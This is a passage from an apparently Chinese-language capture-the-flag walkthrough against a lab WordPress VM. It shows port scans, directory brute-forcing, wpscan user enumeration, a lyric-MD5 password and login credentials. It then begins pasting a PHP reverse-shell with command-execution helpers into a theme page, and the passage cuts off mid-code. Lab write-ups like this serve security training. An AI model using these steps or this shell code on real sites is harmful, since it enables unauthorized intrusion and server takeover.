|_http-title: Site doesn&amp;#39;t have a title (text/html; charset=utf-8).
|_http-server-header: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
80/tcp open http Apache httpd 2.4.38
|_http-title: 404 Not Found
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: Host: 127.0.1.1
TRACEROUTE
HOP RTT ADDRESS
1 1.23 ms localhost (10.9.23.155)
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.20 seconds
&lt;/code>&lt;/pre>&lt;h4 id="3-访问靶机网站">3 访问靶机网站&lt;/h4>
&lt;p>80端口&lt;/p>
&lt;p>&lt;img src="img/20240116200028.png" alt="image.png">&lt;/p>
&lt;p>66端口&lt;/p>
&lt;p>&lt;img src="img/20240116200013.png" alt="image.png">&lt;/p>
&lt;p>最终在66端口下的网页中，我们可以点击&lt;code>here&lt;/code>下载到一个压缩包&lt;/p>
&lt;p>&lt;img src="img/20240116200929.png" alt="image.png">&lt;/p>
&lt;p>解压后，在&lt;code>\vvmlist\vvmlist.github.io\_vvmlist&lt;/code>文件夹中找到一个文件&lt;code>sense.md&lt;/code>，在该文件中可以发现有用的信息&lt;/p>
&lt;p>&lt;img src="img/20240116201121.png" alt="image.png">&lt;/p>
&lt;p>提示我们可以访问&lt;code>http://10.9.23.155/lyricsblog/&lt;/code>&lt;/p>
&lt;p>&lt;img src="img/20240116201640.png" alt="image.png">&lt;/p>
&lt;h4 id="4-web扫描">4 web扫描&lt;/h4>
&lt;p>使用dirb、gobuster对&lt;code>http://10.9.23.155:66&lt;/code>和&lt;code>http://10.9.23.155/lyricsblog/&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#dirb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# dirb http://10.9.23.155:66
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DIRB v2.22
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">By The Dark Raver
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">START_TIME: Tue Jan &lt;span class="m">16&lt;/span> 20:34:05 &lt;span class="m">2024&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">URL_BASE: http://10.9.23.155:66/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GENERATED WORDS: &lt;span class="m">4612&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Scanning URL: http://10.9.23.155:66/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.23.155:66/assets/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==&lt;/span>&amp;gt; DIRECTORY: http://10.9.23.155:66/functions/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.23.155:66/index &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:1060253&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.23.155:66/index.html &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:1060253&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.23.155:66/LICENSE &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:35149&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.23.155:66/assets/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>!&lt;span class="o">)&lt;/span> WARNING: Directory IS LISTABLE. No need to scan it.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>Use mode &lt;span class="s1">&amp;#39;-w&amp;#39;&lt;/span> &lt;span class="k">if&lt;/span> you want to scan it anyway&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---- Entering directory: http://10.9.23.155:66/functions/ ----
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.23.155:66/functions/index &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:6442&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+ http://10.9.23.155:66/functions/index.html &lt;span class="o">(&lt;/span>CODE:200&lt;span class="p">|&lt;/span>SIZE:6442&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">END_TIME: Tue Jan &lt;span class="m">16&lt;/span> 20:38:16 &lt;span class="m">2024&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DOWNLOADED: &lt;span class="m">9224&lt;/span> - FOUND: &lt;span class="m">5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#gobuster&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# gobuster dir -u http://10.9.23.155/lyricsblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Gobuster v3.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">by OJ Reeves &lt;span class="o">(&lt;/span>@TheColonial&lt;span class="o">)&lt;/span> &lt;span class="p">&amp;amp;&lt;/span> Christian Mehlmauer &lt;span class="o">(&lt;/span>@firefart&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Url: http://10.9.23.155/lyricsblog/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Method: GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Threads: &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Negative Status codes: &lt;span class="m">404&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> User Agent: gobuster/3.6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extensions: php,html,txt,sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Timeout: &lt;span class="nv">10s&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting gobuster in directory enumeration &lt;span class="nv">mode&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/.php &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 276&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/.html &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 276&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/index.php &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.9.23.155/lyricsblog/&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-content &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 326&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.9.23.155/lyricsblog/wp-content/&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-login.php &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 5731&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/license.txt &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 19915&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-includes &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 327&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.9.23.155/lyricsblog/wp-includes/&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/readme.html &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 7399&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-trackback.php &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 135&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-admin &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 324&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.9.23.155/lyricsblog/wp-admin/&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/xmlrpc.php &lt;span class="o">(&lt;/span>Status: 405&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 42&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/.html &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 276&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/.php &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 276&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/wp-signup.php &lt;span class="o">(&lt;/span>Status: 302&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 0&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://10.9.23.155/lyricsblog/wp-login.php?action&lt;span class="o">=&lt;/span>register&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Progress: &lt;span class="m">1102800&lt;/span> / &lt;span class="m">1102805&lt;/span> &lt;span class="o">(&lt;/span>100.00%&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">Finished&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">===============================================================&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>没有扫描到什么关键有用的信息&lt;/p>
&lt;p>从之前收集的信息可知这是个基于wordpress框架搭建的网站，所以我们可以再用&lt;code>wpscan&lt;/code>工具扫一下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#基本扫描&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wpscan --url http://10.9.23.155/lyricsblog/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#漏洞扫描&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wpscan --url http://10.9.23.155/lyricsblog/ --enumerate vp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#用户枚举&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wpscan --url http://10.9.23.155/lyricsblog/ --enumerate u
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="img/20240116202849.png" alt="image.png">&lt;/p>
&lt;p>发现一个用户&lt;code>erdalkomurcu&lt;/code>，接下来我们去找密码&lt;/p>
&lt;h4 id="5-密码破解">5 密码破解&lt;/h4>
&lt;p>最后根据wordpress登录页面的提示&lt;/p>
&lt;p>&lt;img src="img/20240116212137.png" alt="image.png">&lt;/p>
&lt;p>在&lt;code>http://10.9.23.155/lyricsblog/&lt;/code>网页中找到了，密码为计算下图歌词MD5的值&lt;/p>
&lt;p>&lt;img src="img/20240116205438.png" alt="image.png">&lt;/p>
&lt;p>Kali中生成一个文件，将歌词复制进去，再使用md5sum计算MD5的值&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# vim token.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# cat token.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Çaresiz derdimin sebebi belli
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Dermanı yaramda arama doktor
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Şifa bulmaz gönlüm senin elinden
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Boşuna benimle uğraşma doktor
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Aşk yarasıdır bu ilaç kapatmaz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Derdin teselli beni avutmaz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Dermanı yardadır sende bulunmaz
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Boşuna benimle uğraşma doktor
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Dokunma benim gönül yarama
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Dokunma doktor
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Bedenimde değil kalbimde derdim
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Tek alışkanlığım bir zalim sevdim
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Sen çekil yanımdan sevdiğim gelsin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Boşuna zamanı harcama doktor
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>root㉿kali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─# md5sum token.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bc78c6ab38e114d6135409e44f7cdda2 token.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>同时在wordpress登录页&lt;code>http://IP/lyricsblog/wp-login.php&lt;/code>的左上角发现密码大写提示&lt;/p>
&lt;p>&lt;img src="img/20240116212819.png" alt="image.png">&lt;/p>
&lt;p>使用账号密码登录&lt;/p>
&lt;pre tabindex="0">&lt;code>账号:erdalkomurcu
密码:BC78C6AB38E114D6135409E44F7CDDA2
&lt;/code>&lt;/pre>&lt;p>登录成功&lt;/p>
&lt;p>&lt;img src="img/20240116213237.png" alt="image.png">&lt;/p>
&lt;h3 id="二wordpress漏洞利用">二、wordpress漏洞利用&lt;/h3>
&lt;p>根据之前打过的靶机[[2001-Lazysysadmin]]可知，wordpress中存在反弹shell漏洞&lt;/p>
&lt;p>随便找一个PHP页面写入反弹shell&lt;/p>
&lt;p>&lt;img src="img/20240116222655.png" alt="image.png">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">which&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$pr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$path&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">execute&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;which &lt;/span>&lt;span class="si">$pr&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$path&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nv">$path&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nv">$pr&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">execute&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$cfe&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$cfe&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">function_exists&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;exec&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">@&lt;/span>&lt;span class="nx">exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$cfe&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$res&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elseif&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">function_exists&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;shell_exec&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="nx">shell_exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$cfe&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">elseif&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">function_exists&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">ob_start&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$cfe&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="nx">ob_get_contents&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">ob_end_clean&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="k">elseif&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">function_exists&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;passthru&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">ob_start&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">passthru&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$cfe&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="nx">ob_get_contents&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">ob_end_clean&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="k">elseif&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">@&lt;/span>&lt;span class="nx">is_resource&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$f&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="nx">popen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$cfe&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;r&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$res&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!@&lt;/span>&lt;span class="nx">feof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$f&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$res&lt;/span> &lt;span class="o">.=&lt;/span> &lt;span class="o">@&lt;/span>&lt;span class="nx">fread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">@&lt;/span>&lt;span class="nx">pclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$f&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">return&lt;/span> &lt;span class="nv">$res&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">function&lt;/span> &lt;span class="nf">cf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$fname&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nv">$text&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$fp&lt;/span>&lt;span class="o">=@&lt;/span>&lt;span class="nx">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$fname&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;w&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
